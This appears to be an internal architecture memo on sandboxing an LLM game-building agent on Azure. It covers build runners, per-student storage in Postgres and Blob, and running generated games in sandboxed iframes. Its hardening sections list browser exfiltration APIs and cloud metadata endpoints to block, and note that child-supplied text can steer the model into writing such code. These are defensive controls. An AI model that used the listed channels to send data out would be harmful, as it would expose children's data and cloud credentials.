# Sandboxes and per-student compute: where Forge runs, where a child's stuff lives, where generated code executes

**Date:** 2026-10-02. **Question:** is "a little VM per student" the right shape? Where should (a) the game-building
agent run (node + headless Chromium), (b) the per-student persistent workspace live, and (c) generated code execute
for the child? Gives costs per student-month, cold starts, concurrency limits, and an Azure IaC sketch that a service
principal with RG Contributor can run.

**Builds on, does not repeat:** `tech-and-market.md` §3.3–3.4 (iframe sandbox, CSP, bridge v1, Google's 3.5% → 69%
repair loop). `factory/coding-agent-harnesses.md` §5 (Forge stage machine, tools, "brain outside, hands inside",
validators). `factory/llm-game-generation.md` §7–8 (G1 fill vs G2 build, $1.5–3.5 per G2, P50 8 min).
`context/decisions.md#forge-infra-azure`, `#azure-only-compute`, `#hosting-azure-container-apps`.

**Evidence tags:**
- **[V]** verified by us today. Either a read-only ARM probe of this subscription, or reading the SDK source.
- **[S]** stated by a cited source.
- **[M]** from memory or secondary reporting; not re-checked today.
- **[U]** unverified estimate. Measure before relying on it (§13).

---

## 0. TL;DR: the decisions this research forces

1. **"A little VM per student" is the wrong unit. The right shape is a VM per build, a folder per student, and an
   iframe per play.**
   - Nothing a child owns needs a live process between lessons. Memory, artifacts and save-states are data.
   - A persistent per-student microVM would cost about **$0.50 per student-month in snapshot storage alone** [U]
     (§9.4). An always-on per-student container would cost about **$20 per student-month** [V arithmetic, §9.4].
   - Per-build ephemeral compute costs about **$0.04 per G2 build** [V arithmetic, §7].
2. **Compute is not the cost driver.**
   - Every serious sandbox (Azure or not) prices a 10-minute 2 vCPU / 4 GiB build at **$0.015–0.045** (§7).
   - The LLM tokens for the same build cost **$1.5–3.5** (`llm-game-generation` §8).
   - So choose the sandbox for **isolation, cold start, egress control and operational fit**, not price.
3. **New finding: Azure Container Apps Sandboxes** (`Microsoft.App/sandboxGroups`) is the Azure-native "E2B".
   - Hardware-isolated microVMs with sub-second start [S].
   - Memory and disk snapshots, with suspend and resume [S].
   - Egress proxy that is default-deny and can inject credentials [S].
   - Billed per vCPU-second and GiB-second at Container Apps rates, and $0 while stopped [S].
   - Available in **eastus2 and centralindia** [V: provider probe].
   - It is the right long-run home for G2 builds.
   - **Blocked today on this subscription:**
     - `SandboxCores` quota is **1** [V].
     - The SP cannot grant itself the data-plane role [V].
   - Both are one-time owner actions (§12.2).
4. **Correction to `coding-agent-harnesses.md` §5.1.** That doc picked ACA dynamic sessions with a custom container.
   - Custom-container session pools are billed as **Dedicated E16 nodes** [S, billing doc]:
     16 vCPU × $0.057077/h + 128 GiB × $0.004978/h + $0.10/h management ≈ **$1.65/h per node** [V: retail price API].
   - That is about **$1,200/month** for one warm node. It is wrong at our scale until we run more than about 7
     concurrent builds around the clock.
   - They also need a data-plane role the SP cannot grant.
   - **Supersede** that choice (§14).
5. **Ship now (Phase 0, no owner action needed): two lanes on the existing `taxila-env`.**
   - **Trusted lane.** A warm Container App `forge-validator` (min 1 replica, Chromium pool). It runs G1 fills and
     gates on *kit code with new data only*. P50 under 3 s to first screenshot [U].
   - **Untrusted lane.** An event-driven **ACA Job** `forge-runner` (2 vCPU / 4 GiB, Playwright image) for G2 builds,
     where the LLM writes code.
     - The runner dials **out** to the orchestrator over WebSocket. Jobs have no ingress [S].
     - It holds no model key and no managed identity.
     - It blocks network for the page at the Chromium level.
   - Cold start is about 20–90 s [U]. Hide it by starting the runner speculatively when the lesson begins.
6. **Phase 1 (after the owner grants role + quota):** move the untrusted lane to **ACA Sandboxes**.
   - Each build is created from a **pre-warmed snapshot**: Chromium launched, kit `node_modules` paged in.
   - Egress policy `Deny` by default, allowing only the orchestrator host.
   - The same `SandboxProvider` interface (§10.2) hides the swap.
7. **The child's code runs only in the child's browser:**
   - a sandboxed iframe on a separate origin (`sandbox="allow-scripts"`, no `allow-same-origin`);
   - a template-owned CSP with `connect-src 'none'`;
   - save-state and telemetry only through the bridge.

   Python lessons (classes 8–9) run **Pyodide in a Web Worker inside that iframe**.
   - Never server-side execution for a child.
   - Never WebContainers (commercial licence, desktop-Chromium-first; §8.3).
8. **Per-student workspace = Postgres rows + private Blob prefix. No VM.**
   - Public game builds are **content-addressed and shared** (`forge/b/<sha>/`) and never contain child data.
   - Per-child parameters reach the game at runtime through the bridge `init` command.
   - Storage, ops and egress together cost **under $0.02 per student-month** [V arithmetic, §9].

---

## 1. Facts about *this* subscription (read-only ARM probe, n=1, 2026-10-02)

Method: client-credentials token for the Forge SP, then `GET`s only:
`providers/Microsoft.App`, `locations/{r}/usages`, the environment and its `/usages`, `roleAssignments`,
`permissions`, and the RG's resources. Script: `scratchpad/probe.mjs` (not committed). Nothing was created. **[V]**

| fact | value | consequence |
|---|---|---|
| SP roles | **Contributor** on `rg-raghavsharma1729-7190`; Foundry Owner on the AI account | can create resources in the RG |
| SP permissions | `actions:*`, but `notActions` include `Microsoft.Authorization/*/Write`; **`dataActions: []`** | **cannot create role assignments**; holds no data-plane rights (session pools, sandboxes, Blob RBAC) |
| `Microsoft.App/sandboxGroups` | registered; api `2026-07-01`, `2026-02-01-preview`; in eastus2, centralindia, southindia | Sandboxes are usable here once quota and role exist |
| `SandboxCores` quota | **0 / 1** in eastus2 and in centralindia | one M sandbox, at most. **Owner must request more** (typical default 500 [S]) |
| `SessionPools` quota | 0 / 20 per region | pools possible, but each pool's data plane needs a role (as above) |
| `taxila-env` | eastus2, workload-profiles env with only a `Consumption` profile, **no VNet** | jobs and apps OK. No platform egress filtering without a VNet |
| env core quotas | Consumption **0.5 / 100** cores; GeneralPurpose 0/200; MemoryOptimized 0/200 | at most **50 concurrent 2-vCPU jobs** before a quota ticket |
| `Microsoft.ContainerInstance` | **NotRegistered** | ACI is unavailable until the owner registers it |
| `Microsoft.Network`, `Microsoft.Cdn`, `Microsoft.Compute`, `Microsoft.ContainerService` | **NotRegistered** | no VNet, NSG, Firewall, Front Door, VMs or AKS until the owner registers them |
| ACR `taxilacr` | Basic, admin user enabled; `taxila-web` pulls with username/password | jobs and sandbox disk images can pull from it with the same credential |
| Storage `taxilaforge` | StorageV2 Standard_LRS, eastus2, public blob access allowed | one public container (`forge`) plus private containers in the same account |

**Discrepancy to flag.** This task's brief lists `taxila-opus` and `taxila-sonnet` as available.
`context/rejected.md#claude-on-foundry-credits` and `#azure-only-compute` record them as deleted (the Marketplace
purchase failed). The sandbox design here is model-agnostic. It does not depend on which builder model wins.

---

## 2. Reframe: three different "computers", three different trust levels

| what | whose code | trust | lifetime | right home |
|---|---|---|---|---|
| **Build machine**: the agent edits, bundles and validates a game | LLM-written code + our kit + our tools | **untrusted**: the model can be steered by child-supplied text (interests, names, chat) | minutes | ephemeral isolated sandbox, one per build |
| **Validation of a G1 fill**: our kit with new JSON | our code; data from the model, schema-checked | trusted code, untrusted data | seconds | warm shared Chromium pool |
| **Child's workspace**: their games, saves, drawings, memory | none (data) | n/a | years | Postgres + private Blob |
| **Play machine**: the game running for the child | LLM-written code (validated) | untrusted | a play session | the child's own browser, sandboxed iframe, separate origin |

The "VM per student" intuition merges rows 3 and 1. Splitting them removes almost all cost and most of the risk.

---

## 3. Azure options in depth

### 3.1 Azure Container Apps Sandboxes (`Microsoft.App/sandboxGroups`): the strongest fit

What it is [S, Learn overview, lifecycle, egress, Bicep; sandboxes.azure.com docs]:

- **A first-class Container Apps resource type, separate from environments.** A *sandbox group* is a regional ARM
  resource. Sandboxes, disk images, snapshots, volumes and secrets live inside it.
- **Two planes.**
  - Control plane: ARM, `management.azure.com`.
  - Data plane: `https://management.<region>.azuredevcompute.io`.
  - Path: `/subscriptions/{sub}/resourceGroups/{rg}/sandboxGroups/{group}/sandboxes/{id}/…`.
  - Data-plane api-version: `2026-02-01-preview`.
  - Token scope in SDK v0.1.0b4: `https://dynamicsessions.io/.default`.
  - Data-plane operations: `stop`, `resume`, `executeShellCommand`, `snapshot`, `lifecycle`, `commit`, `stats`,
    `volumes/add`, and file operations. **[V: read `azure_containerapps_sandbox-0.1.0b4` source, `_helpers.py`,
    `_sandbox_client.py`]**
  - SDKs: Python `azure-containerapps-sandbox`, TypeScript `@azure/containerapps-sandbox`, CLI `aca`
    (1.0.0-preview.1) [S].
- **Isolation:** "lightweight virtual machine (microVM)… its own kernel", described as a "hardware-isolated microVM
  boundary" [S]. The SDK exposes a `vmmType` field, so the hypervisor may vary [V]. Which VMM is used is not
  documented [U].
- **Sizes:**

  | tier | CPU | memory | disk |
  |---|---|---|---|
  | XS | 0.25 | 0.5 GB | 20 GB |
  | S | 0.5 | 1 GB | 20 GB |
  | M (default) | 1 | 2 GB | 20 GB |
  | L | 2 | 4 GB | 40 GB |
  | XL | 4 | 8 GB | 80 GB |

  [S]
- **Lifecycle:**
  - States: `Running` and `Stopped`. An admin can also set `Disabled` [S].
  - Auto-suspend after an idle interval. An SDK default is `auto_suspend_seconds=300, mode="Memory"` [V].
  - Suspend modes: `Memory` (memory + disk) or `Disk` [S].
  - Auto-delete N seconds after stop [S].
  - "Resume in under a second" [S].
  - Public ingress can **wake a stopped sandbox on request** [S].
- **Snapshots:**
  - Full memory + disk. A new sandbox can be created from a snapshot, but its resources cannot change [S].
  - The docs' own Python sample sleeps 15 s after create-from-snapshot and says "a restore needs a short warm-up"
    [S]. **Measure the real ready time (§13 M3).**
- **Disk images:** built from any OCI image, from a private registry with username/token or managed identity [S].
  Public images [S]:
  - `ubuntu` (includes Buildah);
  - `node-22`, `node-24`;
  - `python-3.11…3.14`;
  - a `claude` image with a pinned Claude Code CLI;
  - a `copilot` image with Copilot CLI;
  - an MCP `python-3.12-code-interpreter`.
- **Egress policy** [S]:
  - Set per sandbox at create time; mutable at runtime.
  - `defaultAction` is `Allow` or `Deny`.
  - Ordered rules match on host, path and method. Actions: `Allow`, `Deny`, `Transform` (inject a header from a
    secret or a managed-identity token), `Rewrite`.
  - Inspection modes: `Full`, `Partial`, `None`, `Legacy`.
  - **Credential injection means even a loop *inside* the sandbox never holds the Azure OpenAI key.**
- **Ingress:**
  - Off by default. Opt in per port; an anonymous port gets an HTTPS URL [S].
  - Source-IP ACL: up to 10 rules × 10 CIDRs [V: SDK `_ports.py`].
- **Volumes** [S]:
  - Azure Blob: multi-attach; partial POSIX, no atomic cross-directory rename.
  - Azure Blob BYO.
  - Data Disk: single-attach; full POSIX; memory-mode suspend not supported with it.
- **Cost** [S, sandboxes.azure.com/docs/sandboxes/cost]:
  - vCPU per core-second and memory per GiB-second **while running**, "at the Container Apps pricing page" rates.
  - Storage at **Premium Blob ZRS** rates covers custom disk images and snapshots, including the automatic snapshot
    taken at stop. Storage billing is marked "coming soon".
  - Retail prices [V, retail API]: eastus2 consumption vCPU **$0.000024/s**, memory **$0.000003/GiB-s**; Premium ZRS
    **$0.20/GB-month**.
  - Whether the consumption free grant applies is [U].
- **Limits:**
  - Concurrent active cores: typical **500** per org [S]; **ours is 1** [V].
  - API rate: **3,000 requests/min** [S].
  - Stopped sandboxes do not count against the core quota [S].
- **Reliability:**
  - **No SLA.** Single-region; no zone redundancy [S].
  - Maintenance live-migrates running sandboxes, preserving state [S].
- **RBAC:** every data-plane call needs **Container Apps SandboxGroup Data Owner** (role id
  `c24cf47c-5077-412d-a19c-45202126392c`) [S]. Our SP cannot assign it [V].

Fit for Forge: excellent. Cold start is sub-second (claimed). It is a real VM boundary, so Chromium can run with its
own sandbox too [U]. Egress is default-deny with an allowlist. Snapshot-warm Chromium removes about 1–3 s of browser
launch from every check [U]. It is billed only while running. Region choice: eastus2, next to Azure OpenAI and the
orchestrator.

### 3.2 ACA dynamic sessions

| | code interpreter (`PythonLTS`, `NodeLTS`, `Shell`) | custom container |
|---|---|---|
| image | platform-built; you cannot install Chromium | any image (ours: Playwright) |
| isolation | Hyper-V per session [S] | Hyper-V per session [S] |
| allocation | from a pre-warmed pool, "milliseconds" [S] | from the `readySessionInstances` pool [S] |
| network | `EgressDisabled` (default) or `EgressEnabled`; no allowlist [S] | same |
| lifecycle | `Timed`: cooldown **300–3600 s** [S] | `Timed`, or `OnContainerExit` with `maxAlivePeriodInSeconds` (api ≥ 2025-01-01) [S] |
| max sessions per pool | 600 [S] | `maxConcurrentSessions` [S] |
| requires | — | workload-profiles env (ours qualifies [V]) |
| billing | **$0.03 per session-hour, in 1-hour increments** [S + V price API] | **Dedicated E16 nodes** sized to active + ready sessions [S]: ≈ $1.65/h per node [V arithmetic] |
| auth | Entra token, aud `https://dynamicsessions.io`, role **Azure ContainerApps Session Executor** [S] | same |
| identifiers | 4–128 characters from a restricted set; anyone with the token can open any identifier [S] | same |

Verdict:

- **Code interpreter:** cheap, but no Chromium and no npm (egress off). It cannot run our G2/G4 gates.
- **Custom container:** correct technically, wrong economically below about 7 always-busy builds. One E16 node at
  2 vCPU per session packs about 7 sessions [U, after overhead]: about $0.24/h per session at full packing, with a
  floor of about $1,200/month whenever `readySessionInstances ≥ 1`. With 0 ready sessions, a cold allocation waits
  for an E16 node to provision (minutes [U]). Both forms also need the role we cannot assign.

### 3.3 ACA Jobs (what we can run today)

[S, Learn "Jobs"]:

- **Triggers:** `Manual` (ARM `POST …/jobs/{name}/start`, optionally with a template override), `Schedule`, or
  `Event` (KEDA scalers, e.g. `azure-queue`).
- **Settings:** `pollingInterval` defaults to 30 s. Others: `replicaTimeout`, `replicaRetryLimit`, `parallelism`,
  `minExecutions`, `maxExecutions`.
- **No ingress.** Execution history keeps the last 100 runs.
- **Billing:** active consumption rate per second while running. No idle rate. The subscription-wide free grant of
  180k vCPU-s + 360k GiB-s per month applies [S]. At 2 vCPU / 4 GiB that is about 25 build-hours free each month
  [V arithmetic].
- **RBAC:** starting a job needs `Microsoft.App/jobs/start/action`. Contributor has it [V]. An event-driven job needs
  **no** RBAC at runtime: KEDA reads the queue with a connection-string secret.
- **Warning** [S]: anyone who can start a job can override its template and read its secrets. Keep runner secrets
  out of the job definition. Put a one-time token in the queue message instead.
- **Isolation:**
  - Microsoft documents per-session Hyper-V isolation for *sessions*. It does not state the same for app or job
    replicas on Consumption [U]. **Treat a job as a container boundary, not a VM.**
  - Chromium's own sandbox needs unprivileged user namespaces, which may be unavailable. If so, use `--no-sandbox`
    [U; §13 M2]. The container is then the only wall, which is why Phase 0 compensates (§5.3).
- **Egress:** unrestricted without a VNet. A VNet needs `Microsoft.Network`, which is not registered [V].
- **Cold start** [U, §13 M1], the sum of:
  - the KEDA poll: up to `pollingInterval` (set 5–10 s), or about 0 for a manual start;
  - scheduling;
  - pulling a Playwright image (about 1.5–2 GB [M]) when not cached on the node;
  - node boot.

  Expected 20–90 s.

### 3.4 A warm Container App worker pool (the trusted lane)

A normal Container App (min 1 replica) keeps one Chromium per replica and hands out a fresh `BrowserContext` per
check. Contexts are cheap and isolated from each other in cookies and storage [M]. It runs only kit code with new data
(G1), so a shared process is acceptable.

- Cost at 1 vCPU / 2 GiB, always active: (1 × 2.4e-5 + 2 × 3e-6) × 2.63M s ≈ **$79/month**, minus the free grant
  [V arithmetic].
- Scale-out: HTTP concurrency rule.

### 3.5 Azure Container Instances

- Isolation: "as isolated in a container as it would be in a VM" (hypervisor-level) [S]. Confidential and Spot SKUs
  exist [S].
- Pricing: per second at **$0.0405 per vCPU-h + $0.00445 per GB-h** in eastus2 [V price API]. That is the cheapest
  Azure option per build: about $0.017 per 10 minutes at 2 vCPU / 4 GB.
- Start time: "seconds", with standby pools for faster [S]. With a large image, 30–120 s [U].
- Egress control needs a VNet + NAT gateway [S].
- **Provider not registered** [V]. No advantage over ACA Jobs that justifies a second platform. Skip.

### 3.6 AKS with pod sandboxing (Kata)

- Per-pod VM isolation on AKS [M]. The most control and the most ops.
- `Microsoft.ContainerService` is not registered [V].
- Revisit only at more than about 10k concurrent builds, or if ACA Sandboxes stays preview-only.

---

## 4. Non-Azure systems: what each teaches, why we do not use it

`context/decisions.md#azure-only-compute` excludes Vercel Sandbox and E2B by name, and the same logic covers Daytona,
Modal and Fly. They are listed here for calibration and for design patterns worth copying.

| system | isolation | start | price (list) | limits | lesson for us |
|---|---|---|---|---|---|
| **E2B** | Firecracker microVM [S, `e2b-dev/infra` README] | about 150 ms [M] | $0.000014 per vCPU-s, $0.0000045 per GiB-s; Pro $150/month [S] | Hobby: 20 concurrent, 1 h sessions. Pro: 100 concurrent (up to 1,100 with add-ons), 24 h [S] | **Infra is Apache-2.0 and self-hostable, but needs Linux + KVM** [S]. Components: API, orchestrator, `envd` in-VM agent, edge proxy. Copy the **envd shape**: a tiny RPC agent for process, PTY and file operations inside the VM. |
| **Daytona** | container/VM sandboxes [M] | "sub 90 ms creation" [S] | $0.0504 per vCPU-h; $0.0162 per GiB-h beyond 5 GiB; storage $0.000108 per GiB-h [S] | not stated | Fast-create benchmarks set the bar the Azure claims must meet. Self-host licence: AGPL [M]. |
| **Modal Sandboxes** | gVisor [M] | sub-second [M] | sandboxes about 3× standard: $0.00003942 per core-s, $0.00000667 per GiB-s [S] | Starter: 100 containers [S] | Pricing sandboxes at 3× plain compute shows **isolation is the product**. |
| **Fly Machines** | Firecracker [M] | sub-second for stopped machines [M] | shared-cpu-1x 1 GB $0.00000427/s; stopped rootfs $0.15/GB-month [S] | regions listed without Mumbai [S] | The stop/start-a-machine-per-user model, i.e. the literal "VM per student". Storage for stopped machines is the hidden cost (§9.4). |
| **Vercel Sandbox** | Firecracker [S] | — | Active CPU $0.128/h (I/O wait not billed), memory $0.0212/GB-h, $0.60 per 1M creations, snapshots $0.08/GB-month [S] | Pro: 10,000 concurrent, 24 h sessions, vCPU allocation ramps from 150 to 5,000 per minute [S] | **Bill only active CPU.** An agent build mostly waits on the LLM, which suits "brain outside, sandbox suspended between tool calls". ACA Sandboxes' wake-on-request ingress allows a similar pattern [U]. |
| **Firecracker** | KVM microVM, jailer, seccomp [S] | **≤ 125 ms to guest init**; ≤ 5 MiB overhead; VMM ready in about 12 ms [S, SPECIFICATION.md] | — | needs `/dev/kvm` | Running it ourselves on Azure needs VMs with nested virtualization. `Microsoft.Compute` is not registered [V]. Not worth it while ACA Sandboxes exists. |
| **gVisor** | user-space Go kernel (Sentry + Gofer), no nested virtualization [S] | container-like | — | slow on syscall-heavy loads; incomplete `/proc`, `/sys` [S] | Chromium is syscall-heavy; gVisor is a poor fit for our validator [U]. |

**Cost of one standard build** (10 min, 2 vCPU, 4 GiB), list prices, compute only:

| platform | cost |
|---|---|
| ACA Sandboxes L / ACA Job | $0.036 |
| ACI | $0.017 |
| E2B | $0.028 (+ plan fee) |
| Daytona | $0.017 |
| Modal sandbox | about $0.040 |
| Vercel (50% active) | about $0.035 |
| dynamic sessions custom container, full packing | about $0.040 |

**All within 2.5× of each other, and all at least 40× below the LLM cost of the same build.** [V arithmetic from the
[S] rates]

---

## 5. Answer (a): where the game-building agent runs

### 5.1 Lanes

```
                 lesson (voice teacher)                         child's device
                        │ Director: "a game would help"              ▲ iframe sandbox="allow-scripts" (opaque origin)
                        ▼                                            │ bridge v2 (init/save/events)
 taxila-web (ACA app, eastus2) ── POST /api/forge/jobs ──► forge-orchestrator (in taxila-web at first; split later)
   ├─ LLM gateway (/forge/llm): holds Azure OpenAI key, per-job token + budget caps
   ├─ Reuse resolver → G1 fill?  ───────────────► LANE T (trusted): forge-validator  [ACA app, min 1, Chromium pool]
   │                                                kit code + new JSON only; G0–G3 quick gates; ≤ 25 s
   └─ G2 build? enqueue {jobId, oneTimeToken} ──► LANE U (untrusted): forge-runner
         Storage Queue `forge-jobs`                  Phase 0: ACA Job (event, azure-queue), 2 vCPU / 4 GiB
                                                     Phase 1: ACA Sandbox from warm snapshot, L tier, egress Deny
               ▲  WSS (runner dials OUT)  │ tool calls: fs.*, apply_patch, run_check, screenshot, bundle
               └──────────────────────────┘ observations (≤ 6k tokens each; images as blob refs)
                                                     │ publish: orchestrator uploads dist after hash re-check
                                                     ▼
                         Blob `forge/b/<sha>/…` (public, immutable)   Blob `forge-runs/<jobId>/` (private trajectory)
```

### 5.2 Why the runner dials out, and where the loop lives

- ACA Jobs have no ingress [S]. Reverse connection is the only way to keep "brain outside, hands inside"
  (`coding-agent-harnesses.md` P9). GitHub Actions self-hosted runners use the same shape [M].
- The orchestrator keeps the model loop, the keys, the budgets and the trajectory ledger. The runner is a
  **tool-executor with no judgement**: about 300 lines, `envd`-like (§4).
- **Phase 1 data plane.** The orchestrator could call `executeShellCommand` on the sandbox directly. Keep the WSS
  runner anyway:
  - one protocol across both lanes;
  - streaming output;
  - no per-call ARM token;
  - no data-plane exposure of each tool call.

  The Sandbox egress policy then allows exactly one host, the orchestrator.
- **Baseline arm `codex exec` in the sandbox** (`coding-agent-harnesses.md` §6 b). Possible only on ACA Sandboxes,
  where the egress `Transform` rule injects the `api-key` header [S]. The key is never inside the VM. In a Phase 0
  job, the arm instead calls `/forge/llm` with the one-time token.

### 5.3 Chromium and runner hardening (both phases)

| control | how | why |
|---|---|---|
| no secrets in the runner | one-time token from the queue message (128-bit, bound to `jobId`, TTL = job cap + 5 min); no managed identity on the job; no Azure keys in env | anyone who can start the job can read its secrets anyway [S] |
| generated code never runs in node | node runs only *our* tools: esbuild, tsc, the Playwright driver. Neither esbuild nor tsc executes input. Builder edits are confined to `src/game/**` and `levels.json`; `package.json`, the lockfile, `vite.config` and `/kit` are read-only. Validator V0 rejects violations | the only place LLM code executes is a Chromium renderer |
| page cannot reach the network | serve dist from `http://127.0.0.1:<port>`. Launch with `--host-resolver-rules="MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"`. Playwright `context.route('**/*', r => isLocal(r.request().url()) ? r.continue() : r.abort())`. **Any blocked request fails gate G2** | exfiltration and beaconing become a test failure, not a hope |
| block metadata endpoints | the same resolver rules plus route abort for `169.254.169.254` and `IDENTITY_ENDPOINT`. Phase 1: egress `Deny` | managed-identity tokens are the crown jewels on ACA |
| Chromium flags | `--disable-dev-shm-usage` (no `--ipc=host` on ACA; Playwright warns Chromium can OOM without it [S]), `--disable-gpu`, `--use-angle=swiftshader`. Try the sandboxed launch first, fall back to `--no-sandbox` and record which ran | software GL for WebGL games; know which isolation actually held |
| resource caps | per-check timeouts (5–60 s), kill the process group, `replicaTimeout 1500`, at most 2 Chromium contexts | a runaway game cannot burn a build |
| non-root | image user `pwuser`, writable only `/work` and `/tmp` [S, Playwright Docker] | defence in depth |

**FPS-gate risk.** `coding-agent-harnesses.md` V2 requires ≥ 50 fps median on a 4× CPU-throttled profile. Under
SwiftShader on 2 vCPU that may fail for *every* WebGL game [U]. Calibrate the threshold on the golden kit games in the
runner (§13 M2) before gating on it, or gate on frame-time *regression versus the template*.

### 5.4 Image and warmth

- **`forge-runner` image:**
  - `mcr.microsoft.com/playwright:v1.63.0-noble` (pin it [S]) + node 22 + the kit at `/kit` (read-only), with
    `node_modules` pre-installed and esbuild/tsc caches primed.
  - Built in ACR from the repo, like `taxila-web`.
  - One tag per kit hash.
- **Phase 0:** start a runner when the lesson starts and the Director's prior says P(G2 needed) ≥ 0.3.
  - It idles until a build arrives or 20 minutes pass, at about $0.07 per unused 20-minute wait (2 vCPU / 4 GiB)
    [V arithmetic]. A job cannot shrink while idle; accept the cost or use a 1 vCPU runner.
  - This hides the 20–90 s cold start entirely.
- **Phase 1:** a nightly golden sandbox.
  - Boot from the disk image (made from the ACR image).
  - `npm ci` is already baked in. Launch Chromium, open the kit template once, then **snapshot**.
  - Each build: create from snapshot, Chromium already warm.

### 5.5 Placement summary

| work | lane | why |
|---|---|---|
| G1 fill validation (kit + new JSON) | T, warm pool | trusted code; latency-critical (≤ 25 s) |
| G2 build loop tools (edit, bundle, typecheck, keypoints, solve, playtest, screenshots) | U | LLM-written code |
| critic and judges (vision) | orchestrator | no code execution, only images |
| asset generation (gpt-image-2, about 23 s each [V, `measurements.md`]) | orchestrator, in parallel with the build | network-bound |
| publish | orchestrator | re-hash the dist it downloaded from the runner; never let the runner write to public Blob |

---

## 6. Answer (b): the per-student persistent workspace

### 6.1 Principle

A child's "workspace" is a **logical** object: rows plus a private Blob prefix. It is not a filesystem a process
mounts.

- **Public storage holds only shared, child-free artifacts.**
- **Everything per-child is private and arrives at runtime through the authenticated app.**

This also fixes a latent issue in `forge-infra-azure`, whose layout `forge/<childId?>/<artifactId>/` would put a
child-linked path in a public container.

### 6.2 Layout

```
Blob account (Phase 0: taxilaforge, eastus2; Phase 1: + taxilaplay in centralindia for latency)
  forge/            PUBLIC  b/<buildSha>/index.html, assets/*, manifest.json   ← shared by every child; immutable
                            Cache-Control: public, max-age=31536000, immutable
  forge-runs/       private <jobId>/trajectory.jsonl, shots/*.png, gate-report.json   (lifecycle: Cool@30d, delete@180d)
  learner/          private <childId>/uploads/*, gen/*.png (personal hero images), exports/*
                            served only via the API (stream) or a 10-min account-key SAS; never listed publicly
Postgres (Neon)
  artifact(build_sha PK, kind, family, objective_id, kit_hash, tier, gate_report_url, created_job, status)
  artifact_instance(id PK uuid, child_id, build_sha, params jsonb, created_at, source_lesson_id)
  play_session(id, instance_id, child_id, started_at, ended_at, outcome, max_level, events_n)
  play_event(session_id, t_ms, kind, payload jsonb)          -- partition by month; or batch to Blob NDJSON nightly
  save_state(instance_id PK, child_id, state jsonb ≤ 16 KB, updated_at)
  (learner memory / misconceptions / interests stay in the learner-model tables owned by docs/research/learner/)
```

### 6.3 Contracts

```ts
/** What the app asks for when a child opens a game: never a public child-specific URL. */
export interface PlayTicket {
  instanceId: string;              // uuid v4, unguessable; never the childId
  buildUrl: string;                // https://<play-origin>/forge/b/<sha>/index.html
  buildSha: string;                // SRI-style check of manifest before init
  nonce: string;                   // bridge nonce for this session (tech-and-market §3.4)
  init: {                          // delivered by postMessage AFTER `ready`; this is the only per-child channel
    params: Record<string, string | number | boolean>;   // their numbers, traps, language, pacing, display name
    save?: unknown;                // last save_state, if any
    locale: "hi-Latn" | "en-IN" | string;
  };
  expiresAt: string;               // ticket TTL 2 h
}

/** Bridge additions for persistence (v2 → v2.1). Game → host; host validates with zod and rate-limits. */
type SaveEvent = { v: 2; kind: "taxila:event"; nonce: string; event: "save"; payload: { state: unknown }; t_ms: number };

export interface StudentWorkspace {
  childId: string;
  instances(): Promise<Array<{ instanceId: string; buildSha: string; title: string; lastPlayed?: string; mastery?: number }>>;
  open(instanceId: string): Promise<PlayTicket>;                 // authz: guardian session owns childId
  save(instanceId: string, state: unknown): Promise<void>;       // ≤ 16 KB, last-write-wins
  putPrivateAsset(kind: "upload" | "gen", bytes: Uint8Array, mime: string): Promise<{ key: string }>;
  signedUrl(key: string, ttlSec?: number): Promise<string>;      // ≤ 600 s
  export(): Promise<string>;                                     // guardian data export (DPDP-style rights)
  erase(): Promise<void>;                                        // deletes rows + learner/<childId>/; shared builds untouched
}
```

### 6.4 Why no per-student VM, file share or volume

- **Nothing needs process continuity.** The agent's memory of a child is retrieved per build from Postgres into the
  brief (`GameBrief`). It is not a long-lived agent process.
- **Content addressing gives reuse for free.** 30 children on the same objective × family × skin share one
  `buildSha`. Only `params` differ (`llm-game-generation` §8 economics).
- **Erasure is easy:** one prefix plus rows. With snapshots it would mean tracking a child's data inside VM images.

---

## 7. Answer (c): safe execution of generated code for the child

### 7.1 Browser iframe only. Yes, and here is the stack.

| layer | control | note |
|---|---|---|
| origin | games load from a **different registrable domain** from the app (Blob `*.blob.core.windows.net` today; later `play.taxila.<tld>`) | an opaque origin is the main wall [S, tech-and-market §3.4] |
| iframe | `sandbox="allow-scripts"` only; `allow=""`; `referrerpolicy="no-referrer"` | never add `allow-same-origin`. `localStorage` then throws, so the kit uses only bridge `save` (validator V0 static check) |
| CSP | **template-owned `<meta http-equiv="Content-Security-Policy">` as the first child of `<head>`:** `default-src 'none'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self'; connect-src 'none'; worker-src blob: 'self'` | **Blob storage cannot set response headers**, so in Phase 0 the policy must be in the HTML. A later script cannot loosen a policy already delivered [M]. G0 checks the meta tag is byte-identical to the template. Header CSP (`frame-ancestors`) comes with the Phase 1 play origin (§12.3) |
| static scan (G0) | reject `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, `import(` with a URL, `eval`/`Function(` outside the kit, `document.cookie`, `localStorage`, `top.`/`parent.` other than `parent.postMessage` | cheap; catches most accidents and injected exfiltration |
| dynamic check (G2) | the Playwright run logs every request; **any non-local request fails** | proves what the scan guessed |
| bridge | zod-validated, `e.source` checked, nonce, rate-limited (tech-and-market §3.4) | the only channel for telemetry, saves and init |
| content | text and asset safety gates (llm-game-generation G6) | a different risk (harm, not code) |

### 7.2 Child-written code (Python, classes 8–9; block or JS later)

- **Pyodide in a dedicated Web Worker inside the same sandboxed iframe.**
  - Self-host the Pyodide files on the play origin; the jsDelivr channel is `…/pyodide/v314.0.7/full/` [S].
  - The full distribution is 200+ MB [S], but the core runtime is a small fraction. Load the core plus needed
    packages only. Core size about 10 MB compressed [U].
  - Needs `'wasm-unsafe-eval'` in `script-src` [M].
- **Timeouts:** `worker.terminate()` after N seconds. A cooperative interrupt (`SharedArrayBuffer`) needs cross-origin
  isolation, which the opaque-origin iframe will not have [U]. Accept hard kills.
- **Never execute a child's code server-side.** Nothing in classes 1–9 needs it. If it ever does (for example,
  packages Pyodide lacks), the answer is an ACA Sandbox XS, egress `Deny`, from a snapshot, deleted after the run. Not
  a standing per-child VM.

### 7.3 Why not WebContainers (StackBlitz)

- **Licence:** "required for production usage… in a commercial, for-profit setting" [S].
- **Browsers:** full support on desktop Chromium. Firefox alpha. Safari beta from 16.4 TP. **No mobile browsers
  mentioned** [S]. Our children are mostly on Android phones (Capacitor WebView) [M].
- **Requirements:** `SharedArrayBuffer` plus a credentialless cross-origin isolation mode [S]. That conflicts with an
  opaque-origin sandboxed iframe [U].
